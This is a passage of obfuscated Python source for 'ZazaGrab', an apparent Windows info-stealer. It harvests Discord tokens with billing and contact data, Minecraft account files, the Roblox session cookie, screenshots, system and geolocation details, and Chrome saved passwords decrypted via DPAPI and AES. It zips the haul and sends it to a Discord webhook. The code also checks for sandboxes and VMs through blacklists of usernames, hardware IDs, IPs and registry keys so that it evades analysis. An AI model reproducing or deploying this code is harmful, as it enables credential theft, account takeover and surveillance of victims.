                O00O0O0O00000OOOO +="Hypesquad Bravery, "#line:960
            if (O0O0O00OOO0O00000 ==128 ):#line:961
                O00O0O0O00000OOOO +="HypeSquad Brillance, "#line:962
            if (O0O0O00OOO0O00000 ==256 ):#line:963
                O00O0O0O00000OOOO +="HypeSquad Balance, "#line:964
            if (O0O0O00OOO0O00000 ==512 ):#line:965
                O00O0O0O00000OOOO +="Early Supporter, "#line:966
            if (O0O0O00OOO0O00000 ==16384 ):#line:967
                O00O0O0O00000OOOO +="Gold BugHunter, "#line:968
            if (O0O0O00OOO0O00000 ==131072 ):#line:969
                O00O0O0O00000OOOO +="Verified Bot Developer, "#line:970
            if (O0O0O00OOO0O00000 ==4194304 ):#line:971
                O00O0O0O00000OOOO +="Active Developer, "#line:972
            if (O00O0O0O00000OOOO ==""):#line:973
                O00O0O0O00000OOOO ="None"#line:974
            O0O0OOO0O00OO0O0O =OOOO00O0O0OOOO000 .get ("email")#line:976
            OOO000OO0O0OOOO0O =OOOO00O0O0OOOO000 .get ("phone")if OOOO00O0O0OOOO000 .get ("phone")else "No Phone Number attached"#line:977
            O00OOOOO00OO0O000 =httpx .get (OOO000OOOOO0000OO .dscap1 +'/billing/subscriptions',headers =OOO000OOOOO0000OO .g3t_H (O0OOOO0OOOO0000OO )).json ()#line:978
            O0OO0OOOOO0OOO000 =False #line:979
            O0OO0OOOOO0OOO000 =bool (len (O00OOOOO00OO0O000 )>0 )#line:980
            OO0O00OO000OO000O =bool (len (json .loads (httpx .get (OOO000OOOOO0000OO .dscap1 +"/billing/payment-sources",headers =OOO000OOOOO0000OO .g3t_H (O0OOOO0OOOO0000OO )).text ))>0 )#line:981
            O000O0OOOOOO0O000 .write (f"{' '*17}{OO00OO0OOOO000O0O}\n{'-'*50}\nBilling?: {OO0O00OO000OO000O}\nNitro: {O0OO0OOOOO0OOO000}\nBadges: {O00O0O0O00000OOOO}\nPhone: {OOO000OO0O0OOOO0O}\nToken: {O0OOOO0OOOO0000OO}\nEmail: {O0O0OOO0O00OO0O0O}\n\n")#line:984
        O000O0OOOOOO0O000 .close ()#line:985
    def grabb_mc (OOOOOOO0OOO0O0OOO ):#line:988
        O0OO0O0O0000O0O00 =ntpath .join (OOOOOOO0OOO0O0OOO .dir ,'Minecraft')#line:989
        os .makedirs (O0OO0O0O0000O0O00 ,exist_ok =True )#line:990
        O0O00OOOO0O0OOO0O =ntpath .join (OOOOOOO0OOO0O0OOO .roaming ,'.minecraft')#line:991
        O00O0O00OO000OO00 =['launcher_accounts.json','launcher_profiles.json','usercache.json','launcher_log.txt']#line:994
        for _OOO0OO00O00OOOOO0 in O00O0O00OO000OO00 :#line:997
            if ntpath .exists (ntpath .join (O0O00OOOO0O0OOO0O ,_OOO0OO00O00OOOOO0 )):#line:998
                shutil .copy2 (ntpath .join (O0O00OOOO0O0OOO0O ,_OOO0OO00O00OOOOO0 ),O0OO0O0O0000O0O00 +OOOOOOO0OOO0O0OOO .sep +_OOO0OO00O00OOOOO0 )#line:999
    def grabb_roblox (OOO000O0OOO000O00 ):#line:1003
        def O0O00OOO0O0O0O000 (O0000OO00O00000O0 ):#line:1004
            try :#line:1005
                return subprocess .check_output (fr"powershell Get-ItemPropertyValue -Path {O0000OO00O00000O0}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",creationflags =0x08000000 ).decode ().rstrip ()#line:1008
            except Exception :#line:1009
                return None #line:1010
        OOOO000000OO0OOO0 =O0O00OOO0O0O0O000 (r'HKLM')#line:1011
        if not OOOO000000OO0OOO0 :#line:1012
            OOOO000000OO0OOO0 =O0O00OOO0O0O0O000 (r'HKCU')#line:1013
        if OOOO000000OO0OOO0 :#line:1014
            OOO000O0OOO000O00 .robloxcookies .append (OOOO000000OO0OOO0 )#line:1015
        if OOO000O0OOO000O00 .robloxcookies :#line:1016
            with open (OOO000O0OOO000O00 .dir +"\\Roblox_Cookies.txt","w")as O0O0O0O00OOOOOO0O :#line:1017
                for OO0OOO0OO00O0O000 in OOO000O0OOO000O00 .robloxcookies :#line:1018
                    O0O0O0O00OOOOOO0O .write (OO0OOO0OO00O0O000 +'\n')#line:1019
    def steal_screen (O0000OO0OOO00O0OO ):#line:1021
        O000OO000OOOO000O =ImageGrab .grab (bbox =None ,include_layered_windows =False ,all_screens =True ,xdisplay =None )#line:1027
        O000OO000OOOO000O .save (O0000OO0OOO00O0OO .dir +"\\Screenshot.png")#line:1028
        O000OO000OOOO000O .close ()#line:1029
    def system_informations (OOOOOO000OO000O0O ):#line:1031
        O0O0OO00O00O0O0OO =f"""
{infocom} | {vctm_pc}
Windows key: {OOOOOO000OO000O0O.w1nk33y}
Windows version: {OOOOOO000OO000O0O.w1nv3r}
RAM: {r4m}GB
DISK: {d1sk}GB
HWID: {OOOOOO000OO000O0O.uuidwndz}
IP: {OOOOOO000OO000O0O.ip}
City: {OOOOOO000OO000O0O.city}
Country: {OOOOOO000OO000O0O.country}
Region: {OOOOOO000OO000O0O.region}
Org: {OOOOOO000OO000O0O.org}
GoogleMaps: {OOOOOO000OO000O0O.googlemap}
        """#line:1045
        with open (OOOOOO000OO000O0O .dir +"\\System_Info.txt","w",encoding ="utf-8",errors ='ignore')as OO000000O000OOOO0 :#line:1046
            OO000000O000OOOO0 .write (O0O0OO00O00O0O0OO )#line:1047
    def finished_zg (OOO0O0OOOOO0OO00O ):#line:1055
        for O0OOOO000O0000OO0 in os .listdir (OOO0O0OOOOO0OO00O .dir ):#line:1056
            if O0OOOO000O0000OO0 .endswith ('.txt'):#line:1057
                OOOO0OOO0OOO0OO0O =OOO0O0OOOOO0OO00O .dir +OOO0O0OOOOO0OO00O .sep +O0OOOO000O0000OO0 #line:1058
                with open (OOOO0OOO0OOO0OO0O ,"r",errors ="ignore")as O0OOOOOOO0O0O00OO :#line:1059
                    O0O0OO0OOO0OOO0OO =O0OOOOOOO0O0O00OO .read ()#line:1060
                    if not O0O0OO0OOO0OOO0OO :#line:1061
                        O0OOOOOOO0O0O00OO .close ()#line:1062
                        os .remove (OOOO0OOO0OOO0OO0O )#line:1063
                    else :#line:1064
                        with open (OOOO0OOO0OOO0OO0O ,"w",encoding ="utf-8",errors ="ignore")as OO00OO00O000OO0OO :#line:1065
                            OO00OO00O000OO0OO .write ("Zaza Grab Create By ZAZA | https://github.com/zazaman4000\n\n")#line:1066
                        with open (OOOO0OOO0OOO0OO0O ,"a",encoding ="utf-8",errors ="ignore")as O0OO0000OO000OO0O :#line:1067
                            O0OO0000OO000OO0O .write (O0O0OO0OOO0OOO0OO +"\n\nZaza Grab Create By ZAZA | https://github.com/zazaman4000")#line:1068
        _O0O00O0000OOO0OO0 =ntpath .join (OOO0O0OOOOO0OO00O .appdata ,f'zg-[{infocom}].zip')#line:1070
        O00000OO000OOOOOO =zipfile .ZipFile (_O0O00O0000OOO0OO0 ,"w",zipfile .ZIP_DEFLATED )#line:1071
        O0OOO0OO0OO0OO0O0 =ntpath .abspath (OOO0O0OOOOO0OO00O .dir )#line:1072
        for OOOO0OOO0O0OO0O0O ,_OO0OOO0OO00O00000 ,OOO00OOOO0OOO000O in os .walk (OOO0O0OOOOO0OO00O .dir ):#line:1073
            for O000O000OO0O00OOO in OOO00OOOO0OOO000O :#line:1074
                OO0OO0O00OO000000 =ntpath .abspath (ntpath .join (OOOO0OOO0O0OO0O0O ,O000O000OO0O00OOO ))#line:1075
                OOO00OO00O0000000 =OO0OO0O00OO000000 [len (O0OOO0OO0OO0OO0O0 )+1 :]#line:1076
                O00000OO000OOOOOO .write (OO0OO0O00OO000000 ,OOO00OO00O0000000 )#line:1077
        O00000OO000OOOOOO .close ()#line:1078
        O00O0000000O00OOO ,OO0O0O00OOO0OO000 ,O00OOOOO0OOO0OOOO =0 ,'',''#line:1080
        for _OO0OOO0OO00O00000 ,__ ,OOO00OOOO0OOO000O in os .walk (OOO0O0OOOOO0OO00O .dir ):#line:1081
            for _O00OO00OO0O000OO0 in OOO00OOOO0OOO000O :#line:1082
                OO0O0O00OOO0OO000 +=f"・{_O00OO00OO0O000OO0}\n"#line:1083
                O00O0000000O00OOO +=1 #line:1084
        for O0OOO0OO0O0O00O0O in OOO0O0OOOOO0OO00O .tokens :#line:1085
            O00OOOOO0OOO0OOOO +=f'{O0OOO0OO0O0O00O0O}\n\n'#line:1086
        OOO0O0OO00OOO0O00 =f"{O00O0000000O00OOO} Files Found: "#line:1087
        OO000OO00OO00OO0O ={'name':"ZazaGrab",'avatar_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-color-logo.png','embeds':[{'author':{'name':f'ZazaGrab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-logo-white-on-black-background.png'},'color':374276 ,'description':f'[zazagrab has Geo Localised this guy]({OOO0O0OOOOO0OO00O.googlemap})','fields':[{'name':'\u200b','value':f'''```fix
                                IP: {OOO0O0OOOOO0OO00O.ip.replace(" ", " ") if OOO0O0OOOOO0OO00O.ip else "N/A"}
                                Org: {OOO0O0OOOOO0OO00O.org.replace(" ", " ") if OOO0O0OOOOO0OO00O.org else "N/A"}
                                City: {OOO0O0OOOOO0OO00O.city.replace(" ", " ") if OOO0O0OOOOO0OO00O.city else "N/A"}
                                Region: {OOO0O0OOOOO0OO00O.region.replace(" ", " ") if OOO0O0OOOOO0OO00O.region else "N/A"}
                                Country: {OOO0O0OOOOO0OO00O.country.replace(" ", " ") if OOO0O0OOOOO0OO00O.country else "N/A"}```
                            '''.replace (' ',''),'inline':True },{'name':'\u200b','value':f'''```fix
                                Computer Name: {vctm_pc.replace(" ", " ")}
                                Windows Key: {OOO0O0OOOOO0OO00O.w1nk33y.replace(" ", " ")}
                                Windows Ver: {OOO0O0OOOOO0OO00O.w1nv3r.replace(" ", " ")}
                                Disk Stockage: {d1sk}GB
                                Ram Stockage: {r4m}GB```
                            '''.replace (' ',''),'inline':True },{'name':'**- Tokens:**','value':f'''```yaml
                                {O00OOOOO0OOO0OOOO if O00OOOOO0OOO0OOOO else "tokens not found"}```
                            '''.replace (' ',''),'inline':False },{'name':OOO0O0OO00OOO0O00 ,'value':f'''```ini
                                [
                                {OO0O0O00OOO0OO000.strip()}
                                ]```
                            '''.replace (' ',''),'inline':False }],'footer':{'text':'Zaza Grab Create By ZAZA・https://github.com/zazaman4000'}}]}#line:1146
        with open (_O0O00O0000OOO0OO0 ,'rb')as OO00OO00O000OO0OO :#line:1149
            if OOO0O0OOOOO0OO00O .regex_webhook_dsc in OOO0O0OOOOO0OO00O .discord_webhook :#line:1150
                httpx .post (OOO0O0OOOOO0OO00O .discord_webhook ,json =OO000OO00OO00OO0O )#line:1151
                httpx .post (OOO0O0OOOOO0OO00O .discord_webhook ,files ={'upload_file':OO00OO00O000OO0OO })#line:1152
        os .remove (_O0O00O0000OOO0OO0 )#line:1153
class NoDebugg (Functions ):#line:1161
    inVM =False #line:1162
    def __init__ (OOOOOOOOO00000000 ):#line:1164
        OOOOOOOOO00000000 .processes =list ()#line:1165
        OOOOOOOOO00000000 .bluseurs =["WDAGUtilityAccount","BvJChRPnsxn","Harry Johnson","SqgFOf3G","RGzcBUyrznReg","h7dk1xPr","Robert","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]#line:1170
        OOOOOOOOO00000000 .blpcname =["DESKTOP-CDLNVOQ","BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH","DESKTOP-B0T93D6"]#line:1175
        OOOOOOOOO00000000 .blhwid =["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","79AF5279-16CF-4094-9758-F88A616D81B4","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","BB64E044-87BA-C847-BC0A-C797D1A16A50","2E6FB594-9D55-4424-8E74-CE25A25E36B0","42A82042-3F13-512F-5E3D-6BF4FFFD8518"]#line:1187
        OOOOOOOOO00000000 .blips =['88.132.231.71','78.139.8.50','20.99.160.173','88.153.199.169','84.147.62.12','194.154.78.160','92.211.109.160','195.74.76.222','188.105.91.116','34.105.183.68','92.211.55.199','79.104.209.33','95.25.204.90','34.145.89.174','109.74.154.90','109.145.173.169','34.141.146.114','212.119.227.151','195.239.51.59','192.40.57.234','64.124.12.162','34.142.74.220','188.105.91.173','109.74.154.91','34.105.72.241','109.74.154.92','213.33.142.50','109.74.154.91','93.216.75.209','192.87.28.103','88.132.226.203','195.181.175.105','88.132.225.100','92.211.192.144','34.83.46.130','188.105.91.143','34.85.243.241','34.141.245.25','178.239.165.70','84.147.54.113','193.128.114.45','95.25.81.24','92.211.52.62','88.132.227.238','35.199.6.13','80.211.0.97','34.85.253.170','23.128.248.46','35.229.69.227','34.138.96.23','192.211.110.74','35.237.47.12','87.166.50.213','34.253.248.228','212.119.227.167','193.225.193.201','34.145.195.58','34.105.0.27','195.239.51.3','35.192.93.107']#line:1201
        for O00OO0000OO00OO00 in [OOOOOOOOO00000000 .lstchec ,OOOOOOOOO00000000 .regkey ,OOOOOOOOO00000000 .sp3cCheq ]:#line:1203
            OO0000OO00O0O00OO =threading .Thread (target =O00OO0000OO00OO00 ,daemon =True )#line:1204
            OOOOOOOOO00000000 .processes .append (OO0000OO00O0O00OO )#line:1205
            OO0000OO00O0O00OO .start ()#line:1206
        for O0OOOO0000O000OOO in OOOOOOOOO00000000 .processes :#line:1207
            try :#line:1208
                O0OOOO0000O000OOO .join ()#line:1209
            except RuntimeError :#line:1210
                continue #line:1211
    def programExit (OOO0O0O0OO0O00OOO ):#line:1213
        OOO0O0O0OO0O00OOO .__class__ .inVM =True #line:1214
    def lstchec (O0OO0OO0000O00O0O ):#line:1216
        for O00O0O0O000OO0OOO in [r'D:\Tools',r'D:\OS2',r'D:\NT3X']:#line:1217
            if ntpath .exists (O00O0O0O000OO0OOO ):#line:1218
                O0OO0OO0000O00O0O .programExit ()#line:1219
        for O0OOO000OOOO0O000 in O0OO0OO0000O00O0O .bluseurs :#line:1221
            if infocom ==O0OOO000OOOO0O000 :#line:1222
                O0OO0OO0000O00O0O .programExit ()#line:1223
        for O0O00O0000OOO0OOO in O0OO0OO0000O00O0O .blpcname :#line:1225
            if vctm_pc ==O0O00O0000OOO0OOO :#line:1226
                O0OO0OO0000O00O0O .programExit ()#line:1227
        for O0OOOO0O00O00OOO0 in O0OO0OO0000O00O0O .blips :#line:1229
            if O0OO0OO0000O00O0O .net_1fo ()[0 ]==O0OOOO0O00O00OOO0 :#line:1230
                O0OO0OO0000O00O0O .programExit ()#line:1231
        for O0OO00OOOO000OOO0 in O0OO0OO0000O00O0O .blhwid :#line:1233
            if O0OO0OO0000O00O0O .sys_1fo ()[0 ]==O0OO00OOOO000OOO0 :#line:1234
                O0OO0OO0000O00O0O .programExit ()#line:1235
    def sp3cCheq (O00000OO0OOO00000 ):#line:1237
        if int (r4m )<=3 :#line:1238
            O00000OO0OOO00000 .programExit ()#line:1239
        if int (d1sk )<=120 :#line:1240
            O00000OO0OOO00000 .programExit ()#line:1241
        if int (psutil .cpu_count ())<=1 :#line:1242
            O00000OO0OOO00000 .programExit ()#line:1243
    def regkey (OOO0O00OOO0OOO0O0 ):#line:1245
        O00000OOOO0O0000O =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")#line:1246
        O0O00000OOO000O0O =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")#line:1247
        if (O00000OOOO0O0000O and O0O00000OOO000O0O )!=1 :#line:1248
            OOO0O00OOO0OOO0O0 .programExit ()#line:1249
        OO00O00OOOO0OO00O =winreg .OpenKey (winreg .HKEY_LOCAL_MACHINE ,'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')#line:1251
        try :#line:1252
            OO0O0O00OOOO00O0O =winreg .QueryValueEx (OO00O00OOOO0OO00O ,'0')[0 ]#line:1253
            if ("VMware"or "VBOX")in OO0O0O00OOOO00O0O :#line:1254
                OOO0O00OOO0OOO0O0 .programExit ()#line:1255
        finally :#line:1256
            winreg .CloseKey (OO00O00OOOO0OO00O )#line:1257
if __name__ =="__main__"and os .name =="nt":#line:1264
    asyncio .run (zg_initial_func ().init ())#line:1265
local =os .getenv ('LOCALAPPDATA')#line:1271
roaming =os .getenv ('APPDATA')#line:1272
temp =os .getenv ("TEMP")#line:1273
Threadlist =[]#line:1274
def fetch_conf (OOOOOOOOOO00O0O0O :str )->str or bool |None :#line:1276
        return __config__ .get (OOOOOOOOOO00O0O0O )#line:1277
hook =fetch_conf ("yourwebhookurl")#line:1279
class DATA_BLOB (Structure ):#line:1281
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:1285
def GetData (O0OOOOOOO0OOOO0O0 ):#line:1287
    O00O0O0OO0OO0000O =int (O0OOOOOOO0OOOO0O0 .cbData )#line:1288
    O0OOO0000OO0OOOOO =O0OOOOOOO0OOOO0O0 .pbData #line:1289
    O00O0000OO0OO00O0 =c_buffer (O00O0O0OO0OO0000O )#line:1290
    cdll .msvcrt .memcpy (O00O0000OO0OO00O0 ,O0OOO0000OO0OOOOO ,O00O0O0OO0OO0000O )#line:1291
    windll .kernel32 .LocalFree (O0OOO0000OO0OOOOO )#line:1292
    return O00O0000OO0OO00O0 .raw #line:1293
def CryptUnprotectData (O0OOO00OO0000O000 ,entropy =b''):#line:1295
    O00O0OO0OOO0OOO0O =c_buffer (O0OOO00OO0000O000 ,len (O0OOO00OO0000O000 ))#line:1296
    O0000OO0O00OO00O0 =c_buffer (entropy ,len (entropy ))#line:1297
    O00O0OO00O0O0O00O =DATA_BLOB (len (O0OOO00OO0000O000 ),O00O0OO0OOO0OOO0O )#line:1298
    OO0O000000000OOO0 =DATA_BLOB (len (entropy ),O0000OO0O00OO00O0 )#line:1299
    O0000000O00O0000O =DATA_BLOB ()#line:1300
    if windll .crypt32 .CryptUnprotectData (byref (O00O0OO00O0O0O00O ),None ,byref (OO0O000000000OOO0 ),None ,None ,0x01 ,byref (O0000000O00O0000O )):#line:1302
        return GetData (O0000000O00O0000O )#line:1303
def DecryptValue (O0OOO0O0OO0OO00O0 ,master_key =None ):#line:1305
    O00O0OOO00O0OO0OO =O0OOO0O0OO0OO00O0 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:1306
    if O00O0OOO00O0OO0OO =='v10'or O00O0OOO00O0OO0OO =='v11':#line:1307
        OOO00OO0000OO00O0 =O0OOO0O0OO0OO00O0 [3 :15 ]#line:1308
        O0O0000O0O000O000 =O0OOO0O0OO0OO00O0 [15 :]#line:1309
        O0O0OOOOOO0OOOOOO =AES .new (master_key ,AES .MODE_GCM ,OOO00OO0000OO00O0 )#line:1310
        OOOOOO00O0OOOO0OO =O0O0OOOOOO0OOOOOO .decrypt (O0O0000O0O000O000 )#line:1311
        OOOOOO00O0OOOO0OO =OOOOOO00O0OOOO0OO [:-16 ].decode ()#line:1312
        return OOOOOO00O0OOOO0OO #line:1313
def LoadRequests (OOO00000O000OOO00 ,O0OO00O000OO00OO0 ,data ='',files ='',headers =''):#line:1315
    for O0O00O0OO00O00OOO in range (8 ):#line:1316
        try :#line:1317
            if OOO00000O000OOO00 =='POST':#line:1318
                if data !='':#line:1319
                    O0O000O00OOO0O0O0 =requests .post (O0OO00O000OO00OO0 ,data =data )#line:1320
                    if O0O000O00OOO0O0O0 .status_code ==200 :#line:1321
                        return O0O000O00OOO0O0O0 #line:1322
                elif files !='':#line:1323
                    O0O000O00OOO0O0O0 =requests .post (O0OO00O000OO00OO0 ,files =files )#line:1324
                    if O0O000O00OOO0O0O0 .status_code ==200 or O0O000O00OOO0O0O0 .status_code ==413 :#line:1325
                        return O0O000O00OOO0O0O0 #line:1326
        except :#line:1327
            pass #line:1328
def LoadUrlib (OO0000O0O00OO0OO0 ,data ='',files ='',headers =''):#line:1330
    for OOOO0OOOO0OOOO00O in range (8 ):#line:1331
        try :#line:1332
            if headers !='':#line:1333
                OO0OOOO000OO00OO0 =urlopen (Request (OO0000O0O00OO0OO0 ,data =data ,headers =headers ))#line:1334
                return OO0OOOO000OO00OO0 #line:1335
            else :#line:1336
                OO0OOOO000OO00OO0 =urlopen (Request (OO0000O0O00OO0OO0 ,data =data ))#line:1337
                return OO0OOOO000OO00OO0 #line:1338
        except :#line:1339
            pass #line:1340
def Trust (O0OOO0O000O0O000O ):#line:1343
    global DETECTED #line:1344
    O000OOOO0000O0000 =str (O0OOO0O000O0O000O )#line:1345
    OO0OO00O00000OO00 =re .findall (".google.com",O000OOOO0000O0000 )#line:1346
    if len (OO0OO00O00000OO00 )<-1 :#line:1347
        DETECTED =True #line:1348
        return DETECTED #line:1349
    else :#line:1350
        DETECTED =False #line:1351
        return DETECTED #line:1352
def Reformat (O00O00OO0OO0O00O0 ):#line:1357
    OOO0000O0O00OO0O0 =re .findall ("(\w+[a-z])",O00O00OO0OO0O00O0 )#line:1358
    while "https"in OOO0000O0O00OO0O0 :OOO0000O0O00OO0O0 .remove ("https")#line:1359
    while "com"in OOO0000O0O00OO0O0 :OOO0000O0O00OO0O0 .remove ("com")#line:1360
    while "net"in OOO0000O0O00OO0O0 :OOO0000O0O00OO0O0 .remove ("net")#line:1361
    return list (set (OOO0000O0O00OO0O0 ))#line:1362
def upload (O000O0OOOOOO00O0O ,tk =''):#line:1364
    O0O00OO000OOO000O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:1368
    if O000O0OOOOOO00O0O =="zg_checking":#line:1370
        OO00O0O0OOO0OOO0O ={"content":'',"embeds":[{"fields":[{"name":"Interesting files found on user PC:","value":tk }],"author":{'name':f'Zaza - Grab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-logo-white-on-black-background.png'},"footer":{"text":"github.com/zazaman4000"},'color':374276 ,}],"avatar_url":"https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-logo-black-on-white-background.pn","attachments":[]}#line:1394
        LoadUrlib (hook ,data =dumps (OO00O0O0OOO0OOO0O ).encode (),headers =O0O00OO000OOO000O )#line:1395
        return #line:1396
    OOOOOOOO0OOO00OO0 =O000O0OOOOOO00O0O #line:1398
    O0OOOO00OO00OOO00 ={'file':open (OOOOOOOO0OOO00OO0 ,'rb')}#line:1399
    if "zg_allpasswords"in O000O0OOOOOO00O0O :#line:1401
        OOOOOOOO00OOOOO00 =' | '.join (OO0OOOO0O000OOOO0 for OO0OOOO0O000OOOO0 in paswWords )#line:1403
        if len (OOOOOOOO00OOOOO00 )>1000 :#line:1405
            OO0O0O00O0000O0OO =Reformat (str (paswWords ))#line:1406
            OOOOOOOO00OOOOO00 =' | '.join (OOO00O0OOOO00000O for OOO00O0OOOO00000O in OO0O0O00O0000O0OO )#line:1407
        OO00O0O0OOO0OOO0O ={"content":'',"embeds":[{"fields":[{"name":"Passwords Found:","value":OOOOOOOO00OOOOO00 }],"author":{'name':f'Zaza - Grab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-logo-white-on-black-background.png'},"footer":{"text":"github.com/zazaman4000",},'color':374276 ,}],"avatar_url":"https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-logo-black-on-white-background.pn","attachments":[]}#line:1432
        LoadUrlib (hook ,data =dumps (OO00O0O0OOO0OOO0O ).encode (),headers =O0O00OO000OOO000O )#line:1433
    if "zg_allcookies"in O000O0OOOOOO00O0O :#line:1435
        O000OOO0O0OO0OOO0 =' | '.join (O000OOOO0O0OOO00O for O000OOOO0O0OOO00O in cookiWords )#line:1436
        if len (O000OOO0O0OO0OOO0 )>1000 :#line:1437
            O000O0O0OOO0O0OOO =Reformat (str (cookiWords ))#line:1438
            O000OOO0O0OO0OOO0 =' | '.join (O00000O0OOOO0O0OO for O00000O0OOOO0O0OO in O000O0O0OOO0O0OOO )#line:1439
        OO00O0O0OOO0OOO0O ={"content":'',"embeds":[{"fields":[{"name":"Cookies Found:","value":O000OOO0O0OO0OOO0 }],"author":{'name':f'Zaza - Grab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/zazagrab.gif'},"footer":{"text":"github.com/zazaman4000",},'color':374276 ,}],"avatar_url":"https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-logo-black-on-white-background.pn","attachments":[]}#line:1464
        LoadUrlib (hook ,data =dumps (OO00O0O0OOO0OOO0O ).encode (),headers =O0O00OO000OOO000O )#line:1465
    LoadRequests ("POST",hook ,files =O0OOOO00OO00OOO00 )#line:1467
def writeforfile (OOO0000OO00O00O0O ,OO00O0000OO0OO0OO ):#line:1469
    O00O00000O0O00OOO =os .getenv ("TEMP")+f"\{OO00O0000OO0OO0OO}.txt"#line:1470
    with open (O00O00000O0O00OOO ,mode ='w',encoding ='utf-8')as OOO0000O0OO000OO0 :#line:1471
        OOO0000O0OO000OO0 .write (f"Created by ZAZA | https://github.com/zazaman4000\n\n")#line:1472
        for OO00O000OOOOO000O in OOO0000OO00O00O0O :#line:1473
            if OO00O000OOOOO000O [0 ]!='':#line:1474
                OOO0000O0OO000OO0 .write (f"{OO00O000OOOOO000O}\n")#line:1475
Passw =[]#line:1479
def getPassw (OO0OO000OOOO00OO0 ,OO0O0O0O0OO00OO00 ):#line:1480
    global Passw #line:1481
    if not os .path .exists (OO0OO000OOOO00OO0 ):return #line:1482
    O00O0O0O0OO0O0000 =OO0OO000OOOO00OO0 +OO0O0O0O0OO00OO00 +"/Login Data"#line:1484
    if os .stat (O00O0O0O0OO0O0000 ).st_size ==0 :return #line:1485
    OOO0O0O0OOOO0O00O =temp +"zazagrabed"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OO00000OOO0OO000O in range (8 ))+".db"#line:1487
    shutil .copy2 (O00O0O0O0OO0O0000 ,OOO0O0O0OOOO0O00O )#line:1488
    O0O0000OO0O00O0OO =connect (OOO0O0O0OOOO0O00O )#line:1489
    O0OOO00000OOO000O =O0O0000OO0O00O0OO .cursor ()#line:1490
    O0OOO00000OOO000O .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:1491
    OOO0O0O0OOOOO0O0O =O0OOO00000OOO000O .fetchall ()#line:1492
    O0OOO00000OOO000O .close ()#line:1493
    O0O0000OO0O00O0OO .close ()#line:1494
    os .remove (OOO0O0O0OOOO0O00O )#line:1495
    OO00O0OOOO000OO0O =OO0OO000OOOO00OO0 +"/Local State"#line:1497
    with open (OO00O0OOOO000OO0O ,'r',encoding ='utf-8')as OO0OOOOO0O0OOOO0O :OOO0O0OOO0OO0OOO0 =loads (OO0OOOOO0O0OOOO0O .read ())#line:1498
    OOOOO0O0O000O000O =b64decode (OOO0O0OOO0OO0OOO0 ['os_crypt']['encrypted_key'])#line:1499
    OOOOO0O0O000O000O =CryptUnprotectData (OOOOO0O0O000O000O [5 :])#line:1500
    for O0O0O000OOO0O0000 in OOO0O0O0OOOOO0O0O :#line:1502
        if O0O0O000OOO0O0000 [0 ]!='':#line:1503
            for O000OOO0OO00OO0O0 in keyword :#line:1504
                OOO0OOO0000OOOOO0 =O000OOO0OO00OO0O0 #line:1505
                if "https"in O000OOO0OO00OO0O0 :#line:1506
                    O0O0O00OO0O000OO0 =O000OOO0OO00OO0O0 #line:1507
